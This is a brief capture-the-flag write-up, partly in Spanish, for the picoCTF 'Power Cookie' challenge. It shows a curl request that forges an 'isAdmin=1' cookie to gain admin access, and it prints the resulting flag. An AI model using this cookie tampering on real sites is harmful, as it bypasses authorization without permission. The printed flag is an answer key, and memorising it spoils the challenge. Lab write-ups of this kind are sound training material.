# Power Cookie

---
## Objectivo

Can you get the flag?Go to this [website](http://saturn.picoctf.net:52021/) and see what you can discover.

---
## Solución

``` sh
angel@angelMnt:~/Documentos/ClasesUAZ/SRYS/S2/tmp$ curl http://saturn.picoctf.net:61304/check.php -H "Cookie: isAdmin=1"



<html>
<body>



<p>picoCTF{gr4d3_A_c00k13_0d351e23}</p>


</body>
</html>
angel@angelMnt:~/Documentos/ClasesUAZ/SRYS/S2/tmp$ 


```

### `picoCTF{gr4d3_A_c00k13_0d351e23}`

---
## Notas adicionales

Se cambia la cookie isAdmin = 0 a 1

---
## Referencias
